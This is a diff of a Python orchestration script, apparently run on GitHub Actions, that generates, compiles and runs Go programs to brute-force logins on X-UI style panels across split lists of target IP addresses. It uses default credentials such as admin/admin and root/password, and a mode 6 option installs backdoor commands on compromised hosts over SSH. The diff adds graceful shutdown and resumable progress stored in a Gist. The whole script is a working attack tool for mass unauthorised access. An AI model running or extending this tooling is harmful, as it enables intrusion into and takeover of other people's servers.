@@ -7,7 +7,32 @@ import sys
 import atexit
 import requests
 import json
+import signal
 from datetime import datetime, timedelta, timezone
+
+# --- 全局变量用于信号处理 ---
+# 当接收到关闭信号时，此标志位会变为 True
+SHUTDOWN_REQUESTED = False
+# 用于跟踪当前运行的 Go 子进程
+CURRENT_SUBPROCESS = None
+
+def signal_handler(signum, frame):
+    """
+    捕获到 SIGTERM (来自 GitHub Actions) 或 SIGINT (Ctrl+C) 信号时调用的函数。
+    这是实现优雅退出的关键。
+    """
+    global SHUTDOWN_REQUESTED, CURRENT_SUBPROCESS
+    if not SHUTDOWN_REQUESTED:
+        print(f"\n信号 {signum} 已收到！正在准备优雅退出...")
+        SHUTDOWN_REQUESTED = True
+        # 尝试终止正在运行的 Go 子进程，以快速释放主进程
+        if CURRENT_SUBPROCESS and CURRENT_SUBPROCESS.poll() is None:
+            print("正在终止当前的 Go 子进程...")
+            CURRENT_SUBPROCESS.terminate()
+
+# 注册信号处理器，让脚本"听懂"关闭指令
+signal.signal(signal.SIGTERM, signal_handler)
+signal.signal(signal.SIGINT, signal_handler)
 
 # 依赖将在 GitHub Action 环境中通过 requirements.txt 安装
 try:
@@ -18,42 +43,44 @@ except ImportError:
     print("正在运行环境中，依赖将由 pip 安装...")
     pass
 
-
-# =========================== Gist 上传功能 ===========================
-def upload_to_gist(gist_id, github_token, filename, content):
-    """将文件内容上传或更新到指定的 Gist"""
+# =========================== Gist 交互功能 ===========================
+def get_gist_content(gist_id, github_token, filename):
+    """从 Gist 中获取特定文件的内容，用于读取进度"""
     if not gist_id or not github_token:
-        print("⚠️ 未提供 GIST_ID 或 GITHUB_TOKEN，跳过上传到 Gist。")
-        return
-
-    headers = {
-        "Authorization": f"token {github_token}",
-        "Accept": "application/vnd.github.v3+json",
-    }
+        print("⚠️ 未提供 GIST_ID 或 GITHUB_TOKEN，无法读取 Gist 状态。")
+        return None
+    headers = {"Authorization": f"token {github_token}", "Accept": "application/vnd.github.v3+json"}
     url = f"https://api.github.com/gists/{gist_id}"
-    
-    if not content.strip():
-        print(f"⚠️ 文件 {filename} 内容为空，跳过上传到 Gist。")
-        return
-
-    data = {
-        "files": {
-            filename: {
-                "content": content
-            }
-        }
-    }
     try:
-        print(f"📤 正在将 {filename} 上传到 Gist...")
+        response = requests.get(url, headers=headers)
+        response.raise_for_status()
+        data = response.json()
+        if filename in data['files']:
+            print(f"✅ 成功从 Gist 读取到状态文件: {filename}")
+            return data['files'][filename]['content']
+        else:
+            print(f"ℹ️ Gist 中未找到状态文件 '{filename}'，将创建新状态。")
+            return None
+    except requests.exceptions.RequestException as e:
+        print(f"❌ 读取 Gist 失败: {e}")
+        return None
+
+def update_gist_file(gist_id, github_token, filename, content):
+    """创建或更新 Gist 中的特定文件，用于保存进度或结果"""
+    if not gist_id or not github_token:
+        print("⚠️ 未提供 GIST_ID 或 GITHUB_TOKEN，跳过更新 Gist。")
+        return
+    headers = {"Authorization": f"token {github_token}", "Accept": "application/vnd.github.v3+json"}
+    url = f"https://api.github.com/gists/{gist_id}"
+    data = {"files": {filename: {"content": content}}}
+    try:
         response = requests.patch(url, headers=headers, data=json.dumps(data))
         response.raise_for_status()
-        print(f"✅ 成功将 {filename} 更新到 Gist ID: {gist_id}")
+        print(f"✅ 成功更新 Gist 文件: {filename}")
     except requests.exceptions.RequestException as e:
-        print(f"❌ 上传到 Gist 失败: {e}")
-        print(f"    响应内容: {e.response.text if e.response else 'N/A'}")
+        print(f"❌ 更新 Gist 失败: {e.response.text if e.response else e}")
 
-
-# =========================== xui.go模板1内容 ===========================
+# =========================== Go 模板 ===========================
 XUI_GO_TEMPLATE_1 = '''package main
 
 import (
@@ -63,7 +90,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
-	_ "net/http/pprof" // 引入pprof
+	_ "net/http/pprof"
 	"net/url"
 	"os"
 	"os/signal"
@@ -81,17 +108,16 @@ var totalTasks int64
 var startTime time.Time
 var shutdownRequest = make(chan struct{})
 
-// 使用sync.Pool复用缓冲区，减少内存分配
 var bufferPool = sync.Pool{
 	New: func() interface{} {
-		b := make([]byte, 4*1024) // 4KB buffer
+		b := make([]byte, 4*1024)
 		return &b
 	},
 }
 
 var httpClient = &http.Client{
 	Transport: &http.Transport{
-		MaxIdleConnsPerHost: 100, // 增加每个主机的空闲连接数
+		MaxIdleConnsPerHost: 100,
 	},
 	Timeout: 10 * time.Second,
 }
@@ -252,7 +278,6 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板2内容 ===========================
 XUI_GO_TEMPLATE_2 = '''package main
 
 import (
@@ -453,7 +478,6 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板3内容 ===========================
 XUI_GO_TEMPLATE_3 = '''package main
 
 import (
@@ -647,7 +671,6 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板4内容 ===========================
 XUI_GO_TEMPLATE_4 = '''package main
 
 import (
@@ -847,7 +870,6 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板5内容 ===========================
 XUI_GO_TEMPLATE_5 = '''package main
 
 import (
@@ -1041,7 +1063,6 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板6内容 ===========================
 XUI_GO_TEMPLATE_6 = '''package main
 
 import (
@@ -1412,7 +1433,6 @@ RETRY:
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板7内容 ===========================
 XUI_GO_TEMPLATE_7 = '''package main
 
 import (
@@ -1619,7 +1639,6 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板8内容 ===========================
 XUI_GO_TEMPLATE_8 = '''package main
 
 import (
@@ -1826,7 +1845,6 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== ipcx.py 内容 ===========================
 IPCX_PY_CONTENT = r"""import requests
 import time
 import os
@@ -1916,7 +1934,7 @@ def print_progress_bar(iteration, total, start_time, prefix='', suffix='', lengt
         sys.stdout.write('\n')
 
 def process_ip_port_file(input_file, output_excel):
-    with open(input_file, 'r', encoding='utf-8') as f:
+    with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
         lines = [line.strip() for line in f if line.strip()]
     total_tasks = len(lines)
     start_time = time.time()
@@ -1959,262 +1977,96 @@ def process_ip_port_file(input_file, output_excel):
 
 if __name__ == "__main__":
     process_ip_port_file('xui.txt', 'xui.xlsx')
-
 """
+
 # =========================== 主脚本核心功能 ===========================
-
-def escape_go_string(s: str) -> str:
-    return s.replace("\\", "\\\\").replace('"', '\\"')
-
-def to_go_bool(val: bool) -> str:
-    return "true" if val else "false"
-
+def escape_go_string(s: str) -> str: return s.replace("\\", "\\\\").replace('"', '\\"')
+def to_go_bool(val: bool) -> str: return "true" if val else "false"
 def to_go_string_array_one_line(lines: list) -> str:
-    if not lines:
-        return "[]string{}"
+    if not lines: return "[]string{}"
     return "[]string{" + ", ".join([f'"{escape_go_string(line)}"' for line in lines]) + "}"
-
 def generate_xui_go(semaphore_size, usernames, passwords):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
-    code = XUI_GO_TEMPLATE_1.replace("{semaphore_size}", str(semaphore_size)) \
-                            .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
-    with open('xui.go', 'w', encoding='utf-8') as f:
-        f.write(code)
-
+    code = XUI_GO_TEMPLATE_1.replace("{semaphore_size}", str(semaphore_size)).replace("{user_list}", user_list).replace("{pass_list}", pass_list)
+    with open('xui.go', 'w', encoding='utf-8') as f: f.write(code)
 def generate_xui_go_template2(semaphore_size, usernames, passwords):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
-    code = XUI_GO_TEMPLATE_2.replace("{semaphore_size}", str(semaphore_size)) \
-                            .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
-    with open('xui.go', 'w', encoding='utf-8') as f:
-        f.write(code)
-
+    code = XUI_GO_TEMPLATE_2.replace("{semaphore_size}", str(semaphore_size)).replace("{user_list}", user_list).replace("{pass_list}", pass_list)
+    with open('xui.go', 'w', encoding='utf-8') as f: f.write(code)
 def generate_xui_go_template3(semaphore_size, usernames, passwords):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
-    code = XUI_GO_TEMPLATE_3.replace("{semaphore_size}", str(semaphore_size)) \
-                            .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
-    with open('xui.go', 'w', encoding='utf-8') as f:
-        f.write(code)
-
+    code = XUI_GO_TEMPLATE_3.replace("{semaphore_size}", str(semaphore_size)).replace("{user_list}", user_list).replace("{pass_list}", pass_list)
+    with open('xui.go', 'w', encoding='utf-8') as f: f.write(code)
 def generate_xui_go_template4(semaphore_size, usernames, passwords):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
-    code = XUI_GO_TEMPLATE_4.replace("{semaphore_size}", str(semaphore_size)) \
-                            .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
-    with open('xui.go', 'w', encoding='utf-8') as f:
-        f.write(code)
-
+    code = XUI_GO_TEMPLATE_4.replace("{semaphore_size}", str(semaphore_size)).replace("{user_list}", user_list).replace("{pass_list}", pass_list)
+    with open('xui.go', 'w', encoding='utf-8') as f: f.write(code)
 def generate_xui_go_template5(semaphore_size, usernames, passwords):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
-    code = XUI_GO_TEMPLATE_5.replace("{semaphore_size}", str(semaphore_size)) \
-                            .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
-    with open('xui.go', 'w', encoding='utf-8') as f:
-        f.write(code)
-
+    code = XUI_GO_TEMPLATE_5.replace("{semaphore_size}", str(semaphore_size)).replace("{user_list}", user_list).replace("{pass_list}", pass_list)
+    with open('xui.go', 'w', encoding='utf-8') as f: f.write(code)
 def generate_xui_go_template6(semaphore_size, usernames, passwords, install_backdoor, custom_cmds):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
     backdoor_flag = to_go_bool(install_backdoor)
     cmd_array = to_go_string_array_one_line(custom_cmds)
-    code = XUI_GO_TEMPLATE_6.replace("{semaphore_size}", str(semaphore_size)) \
-                            .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list) \
-                            .replace("{enable_backdoor}", backdoor_flag) \
-                            .replace("{custom_backdoor_cmds}", cmd_array)
-    with open('xui.go', 'w', encoding='utf-8') as f:
-        f.write(code)
-
+    code = XUI_GO_TEMPLATE_6.replace("{semaphore_size}", str(semaphore_size)).replace("{user_list}", user_list).replace("{pass_list}", pass_list).replace("{enable_backdoor}", backdoor_flag).replace("{custom_backdoor_cmds}", cmd_array)
+    with open('xui.go', 'w', encoding='utf-8') as f: f.write(code)
 def generate_xui_go_template7(semaphore_size, usernames, passwords):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
-    code = XUI_GO_TEMPLATE_7.replace("{semaphore_size}", str(semaphore_size)) \
-                            .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
-    with open('xui.go', 'w', encoding='utf-8') as f:
-        f.write(code)
-
+    code = XUI_GO_TEMPLATE_7.replace("{semaphore_size}", str(semaphore_size)).replace("{user_list}", user_list).replace("{pass_list}", pass_list)
+    with open('xui.go', 'w', encoding='utf-8') as f: f.write(code)
 def generate_xui_go_template8(semaphore_size, usernames, passwords):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
-    code = XUI_GO_TEMPLATE_8.replace("{semaphore_size}", str(semaphore_size)) \
-                            .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
-    with open('xui.go', 'w', encoding='utf-8') as f:
-        f.write(code)
-
+    code = XUI_GO_TEMPLATE_8.replace("{semaphore_size}", str(semaphore_size)).replace("{user_list}", user_list).replace("{pass_list}", pass_list)
+    with open('xui.go', 'w', encoding='utf-8') as f: f.write(code)
 def generate_ipcx_py():
-    with open('ipcx.py', 'w', encoding='utf-8') as f:
-        f.write(IPCX_PY_CONTENT)
-
-def split_file(input_file, lines_per_file):
-    with open(input_file, 'r', encoding='utf-8') as f:
-        lines = f.readlines()
-    for idx, start in enumerate(range(0, len(lines), lines_per_file), 1):
-        with open(os.path.join(TEMP_PART_DIR, f"part_{idx}.txt"), 'w', encoding='utf-8') as fout:
-            fout.writelines(lines[start:start + lines_per_file])
+    with open('ipcx.py', 'w', encoding='utf-8') as f: f.write(IPCX_PY_CONTENT)
 
 def compile_go_program(template_mode):
-    """
-    编译 Go 程序。现在直接调用 'go' 命令，因为它已由 setup-go action 添加到 PATH。
-    """
     executable_name = "xui_executable"
-    if sys.platform == "win32":
-        executable_name += ".exe"
-
+    if sys.platform == "win32": executable_name += ".exe"
     print("--- 正在编译Go程序... ---")
-    
     go_env = os.environ.copy()
-    if 'HOME' not in go_env:
-        go_env['HOME'] = '/tmp'
-    if 'GOCACHE' not in go_env:
-        go_env['GOCACHE'] = '/tmp/.cache/go-build'
-
-    # 为需要额外依赖的模式初始化 go.mod
+    if 'HOME' not in go_env: go_env['HOME'] = '/tmp'
+    if 'GOCACHE' not in go_env: go_env['GOCACHE'] = '/tmp/.cache/go-build'
     if template_mode == 6:
         if not os.path.exists("go.mod"):
             subprocess.run(['go', "mod", "init", "xui"], check=True, capture_output=True, env=go_env)
         subprocess.run(['go', "get", "golang.org/x/crypto/ssh"], check=True, capture_output=True, env=go_env)
-
     try:
-        result = subprocess.run(
-            ['go', 'build', '-o', executable_name, 'xui.go'],
-            capture_output=True,
-            text=True,
-            check=True,
-            encoding='utf-8',
-            env=go_env
-        )
-        if result.stderr:
-            print("--- Go编译器警告 ---")
-            print(result.stderr)
+        result = subprocess.run(['go', 'build', '-o', executable_name, 'xui.go'], capture_output=True, text=True, check=True, encoding='utf-8', env=go_env)
+        if result.stderr: print(f"--- Go编译器警告 ---\n{result.stderr}")
         print(f"--- Go程序编译成功: {executable_name} ---")
         return executable_name
     except subprocess.CalledProcessError as e:
-        print("--- Go 程序编译失败 ---")
-        print(f"返回码: {e.returncode}")
-        print("--- 标准输出 ---")
-        print(e.stdout)
-        print("--- 错误输出 ---")
-        print(e.stderr)
-        print("--------------------------")
+        print(f"--- Go 程序编译失败 ---\n返回码: {e.returncode}\n--- 标准输出 ---\n{e.stdout}\n--- 错误输出 ---\n{e.stderr}\n--------------------------")
         sys.exit(1)
-
-def print_progress_bar(iteration, total, start_time, prefix='', suffix='', length=50, fill='█'):
-    elapsed_time = time.time() - start_time
-    if total == 0:
-        percent_str = "100.0"
-        iteration = total
-    else:
-        percent_str = "{0:.1f}".format(100 * (iteration / float(total)))
-    
-    filled_length = int(length * iteration // total) if total > 0 else length
-    bar = fill * filled_length + '-' * (length - filled_length)
-
-    if iteration > 0 and elapsed_time > 0:
-        its_per_sec = iteration / elapsed_time
-        remaining_time = (total - iteration) / its_per_sec
-        eta_str = time.strftime('%M:%S', time.gmtime(remaining_time))
-    else:
-        its_per_sec = 0
-        eta_str = "??:??"
-
-    elapsed_str = time.strftime('%M:%S', time.gmtime(elapsed_time))
-    progress_str = f'\r{prefix} |{bar}| {iteration}/{total} [{elapsed_str}<{eta_str}, {its_per_sec:.2f}it/s] {suffix}      '
-    
-    sys.stdout.write(progress_str)
-    sys.stdout.flush()
-    if iteration == total:
-        sys.stdout.write('\n')
-
-def run_xui_for_parts(sleep_seconds, executable_name):
-    part_files = sorted([f for f in os.listdir(TEMP_PART_DIR) if f.startswith('part_') and f.endswith('.txt')])
-    total_parts = len(part_files)
-    start_time = time.time()
-
-    total_memory = psutil.virtual_memory().total
-    mem_limit = int(total_memory * 0.70 / 1024 / 1024)
-    print(f"检测到总内存: {total_memory / 1024 / 1024:.2f} MiB。将设置Go内存限制为: {mem_limit}MiB")
-    
-    run_env = os.environ.copy()
-    run_env["GOMEMLIMIT"] = f"{mem_limit}MiB"
-    run_env["GOGC"] = "50"
-    print("--- 已设置Go垃圾回收器(GC)更积极地运行。 ---")
-
-    print_progress_bar(0, total_parts, start_time, prefix='爆破进度', suffix='开始...')
-    for idx, part in enumerate(part_files, 1):
-        shutil.copy(os.path.join(TEMP_PART_DIR, part), 'results.txt')
-
-        try:
-            if sys.platform != "win32":
-                os.chmod(executable_name, 0o755)
-            
-            cmd = ['./' + executable_name]
-            process = subprocess.Popen(
-                cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.STDOUT,
-                text=True,
-                encoding='utf-8',
-                env=run_env
-            )
-            
-            for line in iter(process.stdout.readline, ''):
-                if not line.strip().startswith('\r'):
-                    sys.stdout.write(line)
-                    sys.stdout.flush()
-
-            process.wait()
-            if process.returncode != 0:
-                 raise subprocess.CalledProcessError(process.returncode, cmd)
-
-        except subprocess.CalledProcessError as e:
-            print(f"\n--- 程序执行失败: {part} ---")
-            print(f"返回码: {e.returncode}")
-            sys.exit(1)
-
-        output_file = os.path.join(TEMP_XUI_DIR, f'xui{idx}.txt')
-        if os.path.exists('xui.txt'):
-            shutil.move('xui.txt', output_file)
-        
-        if os.path.exists("hmsuccess.txt"):
-            shutil.move("hmsuccess.txt", os.path.join(TEMP_HMSUCCESS_DIR, f"hmsuccess{idx}.txt"))
-        if os.path.exists("hmfail.txt"):
-            shutil.move("hmfail.txt", os.path.join(TEMP_HMFAIL_DIR, f"hmfail{idx}.txt"))
-
-        print_progress_bar(idx, total_parts, start_time, prefix='爆破进度', suffix=f'已完成: {part}')
-        time.sleep(sleep_seconds)
 
 def merge_xui_files():
     merged_file = 'xui.txt' 
-    if os.path.exists(merged_file):
-        os.remove(merged_file)
-
+    if os.path.exists(merged_file): os.remove(merged_file)
     with open(merged_file, 'w', encoding='utf-8') as outfile:
         for f in sorted(os.listdir(TEMP_XUI_DIR)):
-            if f.startswith("xui") and f.endswith(".txt"):
-                with open(os.path.join(TEMP_XUI_DIR, f), 'r', encoding='utf-8') as infile:
+            if f.startswith("xui_") and f.endswith(".txt"):
+                with open(os.path.join(TEMP_XUI_DIR, f), 'r', encoding='utf-8', errors='ignore') as infile:
                     shutil.copyfileobj(infile, outfile)
 
 def merge_result_files(prefix: str, output_name: str, target_dir: str):
     output_path = output_name 
-    if os.path.exists(output_path):
-        os.remove(output_path)
-    
-    files_to_merge = [os.path.join(target_dir, name) for name in sorted(os.listdir(target_dir)) if name.startswith(prefix) and name.endswith(".txt")]
-    if not files_to_merge:
-        return
-
-    with open(output_path, "w", encoding="utf-8") as out:
+    if os.path.exists(output_path): os.remove(output_path)
+    files_to_merge = [os.path.join(target_dir, name) for name in sorted(os.listdir(target_dir)) if name.startswith(prefix)]
+    if not files_to_merge: return
+    with open(output_path, "wb") as out:
         for f_path in files_to_merge:
-            with open(f_path, "r", encoding="utf-8") as f:
+            with open(f_path, "rb") as f:
                 shutil.copyfileobj(f, out)
 
 def run_ipcx():
@@ -2222,172 +2074,209 @@ def run_ipcx():
         print("--- 正在运行 IP 信息查询... ---")
         subprocess.run([sys.executable, 'ipcx.py'])
 
+# =========================== 逻辑修改部分 ===========================
+def split_file(input_file, lines_per_file):
+    part_files = []
+    with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
+        lines = f.readlines()
+    for idx, start in enumerate(range(0, len(lines), lines_per_file), 1):
+        part_name = f"part_{idx}.txt"
+        part_files.append(part_name)
+        with open(os.path.join(TEMP_PART_DIR, part_name), 'w', encoding='utf-8') as fout:
+            fout.writelines(lines[start:start + lines_per_file])
+    return part_files
+
+def run_single_part(executable_name, part_file):
+    global CURRENT_SUBPROCESS
+    print(f"\n--- 开始处理分片: {part_file} ---")
+    shutil.copy(os.path.join(TEMP_PART_DIR, part_file), 'results.txt')
+
+    total_memory = psutil.virtual_memory().total
+    mem_limit = int(total_memory * 0.70 / 1024 / 1024)
+    run_env = os.environ.copy()
+    run_env["GOMEMLIMIT"] = f"{mem_limit}MiB"
+    run_env["GOGC"] = "50"
+
+    try:
+        if sys.platform != "win32": os.chmod(executable_name, 0o755)
+        cmd = ['./' + executable_name]
+        CURRENT_SUBPROCESS = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, encoding='utf-8', errors='replace')
+        
+        while True:
+            output = CURRENT_SUBPROCESS.stdout.readline()
+            if output == '' and CURRENT_SUBPROCESS.poll() is not None: break
+            if output: sys.stdout.write(output); sys.stdout.flush()
+        
+        if CURRENT_SUBPROCESS.returncode != 0:
+            raise subprocess.CalledProcessError(CURRENT_SUBPROCESS.returncode, cmd)
+        
+        print(f"--- ✔️ 分片处理成功: {part_file} ---")
+        output_file = os.path.join(TEMP_XUI_DIR, f'xui_{part_file}')
+        if os.path.exists('xui.txt'): shutil.move('xui.txt', output_file)
+        if os.path.exists("hmsuccess.txt"): shutil.move("hmsuccess.txt", os.path.join(TEMP_HMSUCCESS_DIR, f"hmsuccess_{part_file}"))
+        if os.path.exists("hmfail.txt"): shutil.move("hmfail.txt", os.path.join(TEMP_HMFAIL_DIR, f"hmfail_{part_file}"))
+        return True
+
+    except subprocess.CalledProcessError as e:
+        if not SHUTDOWN_REQUESTED:
+            print(f"\n--- ❌ 程序执行失败: {part_file} ---\n返回码: {e.returncode}\n此分片将不会被标记为完成，下次运行时会重试。")
+        return False
+    finally:
+        CURRENT_SUBPROCESS = None
+
 def clean_temp_files():
     print("--- 正在清理临时文件... ---")
     shutil.rmtree(TEMP_PART_DIR, ignore_errors=True)
     shutil.rmtree(TEMP_XUI_DIR, ignore_errors=True)
     shutil.rmtree(TEMP_HMSUCCESS_DIR, ignore_errors=True)
     shutil.rmtree(TEMP_HMFAIL_DIR, ignore_errors=True)
-
     for f in ['results.txt', 'xui.go', 'ipcx.py', 'go.mod', 'go.sum', 'xui_executable', 'xui_executable.exe']: 
         if os.path.exists(f):
-            try:
-                os.remove(f)
-            except OSError:
-                pass
+            try: os.remove(f)
+            except OSError: pass
 
 if __name__ == "__main__":
-    # 从环境变量中读取配置
-    TEMPLATE_MODE = int(os.environ.get("TEMPLATE_MODE", "1"))
-    INPUT_FILE = os.environ.get("INPUT_FILE", "1.txt")
-    LINES_PER_FILE = int(os.environ.get("LINES_PER_FILE", "5000"))
-    SLEEP_SECONDS = int(os.environ.get("SLEEP_SECONDS", "2"))
-    SEMAPHORE_SIZE = int(os.environ.get("SEMAPHORE_SIZE", "250"))
-    USE_CUSTOM_DICT = os.environ.get("USE_CUSTOM_DICT", "false").lower() == "true"
-    INSTALL_BACKDOOR = os.environ.get("INSTALL_BACKDOOR", "false").lower() == "true"
-    
-    # 从 Secrets 中读取敏感信息
-    BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
-    CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
+    JOB_START_TIME = time.time()
+    JOB_TIMEOUT_SECONDS = 4.8 * 60 * 60 
+
     GIST_ID = os.environ.get("GIST_ID")
     GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN")
-
-    print("================== 配置信息 ==================")
-    print(f"  - 模式 (TEMPLATE_MODE): {TEMPLATE_MODE}")
-    print(f"  - 输入文件 (INPUT_FILE): {INPUT_FILE}")
-    print(f"  - 分割行数 (LINES_PER_FILE): {LINES_PER_FILE}")
-    print(f"  - 爆破间隔 (SLEEP_SECONDS): {SLEEP_SECONDS}s")
-    print(f"  - 线程数 (SEMAPHORE_SIZE): {SEMAPHORE_SIZE}")
-    print(f"  - 使用自定义字典 (USE_CUSTOM_DICT): {USE_CUSTOM_DICT}")
-    print(f"  - 安装后门 (INSTALL_BACKDOOR): {INSTALL_BACKDOOR}")
-    print("============================================")
-
-    if not os.path.exists(INPUT_FILE):
-        print(f"❌ 错误: 输入文件 '{INPUT_FILE}' 不存在。请确保 URL 下载成功。")
-        sys.exit(1)
-
-    # 凭据加载逻辑
-    if TEMPLATE_MODE == 7:
-        usernames = ["2cXaAxRGfddmGz2yx1wA"]
-        if USE_CUSTOM_DICT:
-            if not os.path.exists("password.txt"):
-                print("❌ 错误: 缺少 password.txt 文件，请检查后重试")
-                sys.exit(1)
-            passwords = [line for line in open("password.txt", encoding='utf-8').read().splitlines() if line.strip()]
-        else:
-            passwords = ["2cXaAxRGfddmGz2yx1wA"]
-    else:
-        if USE_CUSTOM_DICT:
-            if not os.path.exists("username.txt") or not os.path.exists("password.txt"):
-                print("❌ 错误: 选择使用自定义字典但缺少 username.txt 或 password.txt。请确保文件已通过URL下载或已存在于仓库中。")
-                sys.exit(1)
-            usernames = [line for line in open("username.txt", encoding='utf-8').read().splitlines() if line.strip()]
-            passwords = [line for line in open("password.txt", encoding='utf-8').read().splitlines() if line.strip()]
-        else:
-            if TEMPLATE_MODE == 3: usernames, passwords = ["sysadmin"], ["sysadmin"]
-            elif TEMPLATE_MODE == 8: usernames, passwords = ["root"], ["password"]
-            else: usernames, passwords = ["admin"], ["admin"]
-
-    CUSTOM_BACKDOOR_CMDS = []
-    if INSTALL_BACKDOOR:
-        if not os.path.exists("后门命令.txt"):
-            print("❌ 错误: 选择安装后门但缺少 '后门命令.txt'。")
-            sys.exit(1)
-        with open("后门命令.txt", encoding='utf-8') as f:
-            CUSTOM_BACKDOOR_CMDS = [line.strip().replace('"', '\\"') for line in f if line.strip()]
-
-    start = time.time()
-    final_result_files = {}
-
-    TEMP_PART_DIR = "temp_parts"
-    TEMP_XUI_DIR = "xui_outputs"
-    TEMP_HMSUCCESS_DIR = "temp_hmsuccess"
-    TEMP_HMFAIL_DIR = "temp_hmfail"
+    PROGRESS_FILE_NAME = os.environ.get("PROGRESS_FILE_NAME", "scanner_progress.json")
+    ACTION_INPUTS = { "input_file_url": os.environ.get("INPUT_FILE_URL") }
     
+    BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
+    CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
+
+    progress_data = {}
     try:
-        os.makedirs(TEMP_PART_DIR, exist_ok=True)
-        os.makedirs(TEMP_XUI_DIR, exist_ok=True)
-        os.makedirs(TEMP_HMSUCCESS_DIR, exist_ok=True)
-        os.makedirs(TEMP_HMFAIL_DIR, exist_ok=True)
-
-        template_map = {
-            1: (generate_xui_go, (SEMAPHORE_SIZE, usernames, passwords)),
-            2: (generate_xui_go_template2, (SEMAPHORE_SIZE, usernames, passwords)),
-            3: (generate_xui_go_template3, (SEMAPHORE_SIZE, usernames, passwords)),
-            4: (generate_xui_go_template4, (SEMAPHORE_SIZE, usernames, passwords)),
-            5: (generate_xui_go_template5, (SEMAPHORE_SIZE, usernames, passwords)),
-            6: (generate_xui_go_template6, (SEMAPHORE_SIZE, usernames, passwords, INSTALL_BACKDOOR, CUSTOM_BACKDOOR_CMDS)),
-            7: (generate_xui_go_template7, (SEMAPHORE_SIZE, usernames, passwords)),
-            8: (generate_xui_go_template8, (SEMAPHORE_SIZE, usernames, passwords)),
-        }
-
-        gen_func, args = template_map[TEMPLATE_MODE]
-        gen_func(*args)
-
-        executable = compile_go_program(TEMPLATE_MODE)
-        generate_ipcx_py()
-        split_file(INPUT_FILE, LINES_PER_FILE)
-        run_xui_for_parts(SLEEP_SECONDS, executable)
+        json_content = get_gist_content(GIST_ID, GITHUB_TOKEN, PROGRESS_FILE_NAME)
+        if json_content:
+            try: progress_data = json.loads(json_content)
+            except json.JSONDecodeError: progress_data = {}
         
-        merge_xui_files()
-        merge_result_files("hmsuccess", "hmsuccess.txt", TEMP_HMSUCCESS_DIR)
-        merge_result_files("hmfail", "hmfail.txt", TEMP_HMFAIL_DIR)
+        if progress_data.get("source_url") != ACTION_INPUTS["input_file_url"]:
+            print("ℹ️ 检测到新的源文件URL，将重置处理进度。")
+            progress_data = {"source_url": ACTION_INPUTS["input_file_url"], "completed_parts": []}
 
-        run_ipcx()
+        TEMP_PART_DIR = "temp_parts"; TEMP_XUI_DIR = "xui_outputs"; TEMP_HMSUCCESS_DIR = "temp_hmsuccess"; TEMP_HMFAIL_DIR = "temp_hmfail"
+        os.makedirs(TEMP_PART_DIR, exist_ok=True); os.makedirs(TEMP_XUI_DIR, exist_ok=True); os.makedirs(TEMP_HMSUCCESS_DIR, exist_ok=True); os.makedirs(TEMP_HMFAIL_DIR, exist_ok=True)
+        
+        # --- 凭据加载逻辑 ---
+        TEMPLATE_MODE = int(os.environ.get("TEMPLATE_MODE", "1"))
+        USE_CUSTOM_DICT = os.environ.get("USE_CUSTOM_DICT", "false").lower() == "true"
+        if TEMPLATE_MODE == 7:
+            usernames = ["2cXaAxRGfddmGz2yx1wA"]
+            if USE_CUSTOM_DICT:
+                if not os.path.exists("password.txt"): print("❌ 错误: 缺少 password.txt 文件"); sys.exit(1)
